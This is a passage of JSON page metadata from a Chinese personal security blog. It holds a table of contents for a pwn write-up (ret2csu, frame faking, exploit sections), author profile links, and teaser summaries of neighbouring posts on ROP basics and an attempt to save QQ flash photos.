href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2csu\"><span class=\"toc-text\">ret2csu</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%91%E9%80%81payload%EF%BC%9A\"><span class=\"toc-text\">第一次发送payload：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%91%E9%80%81payload%EF%BC%9A\"><span class=\"toc-text\">第二次发送payload：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%8F%91%E9%80%81payload\"><span class=\"toc-text\">第三次发送payload</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#frame-faking\"><span class=\"toc-text\">frame faking</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"QQ闪照破解（待完结）","uid":"cca552dbfefca5d5c398c58d9b5bb49c","slug":"QQ闪照","date":"2021-10-13T11:02:46.000Z","updated":"2021-10-13T12:12:39.912Z","comments":true,"path":"api/articles/QQ闪照.json","keywords":null,"cover":"https://i.loli.net/2021/10/13/SQzI7OaUjl2bJ83.jpg","text":" 和朋友聊天时突发奇想，想尝试一下获取闪照源文件，忙了一个下午还是没有解决（主要是太菜了 /(ㄒoㄒ)/~~ ） 原理和思路闪照貌似是一种木马改编而来，但是因为实用性不高可能就被设计成闪照了（盲猜）。闪照的工作原理大概是有一个FLAG_SECURE窗口，如果启用了FLAG_SEC...","link":"","photos":[],"count_time":{"symbolsCount":"8.6k","symbolsTime":"8 mins."},"categories":[],"tags":[{"name":"感想","slug":"感想","count":2,"path":"api/tags/感想.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}},"next_post":{"title":"ROP-x86","uid":"a1737faa9c5d2f3d8075974e9ccad146","slug":"ROP-x86","date":"2021-10-05T10:23:30.000Z","updated":"2021-11-06T02:16:43.925Z","comments":true,"path":"api/articles/ROP-x86.json","keywords":null,"cover":"https://i.loli.net/2021/06/06/3ZBmwPkcIXjUE17.jpg","text":"ROP原理随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadge...","link":"","photos":[],"count_time":{"symbolsCount":"16k","symbolsTime":"15 mins."},"categories":[{"name":"学习记录","slug":"学习记录","count":3,"path":"api/categories/学习记录.json"}],"tags":[{"name":"pwn","slug":"pwn","count":7,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}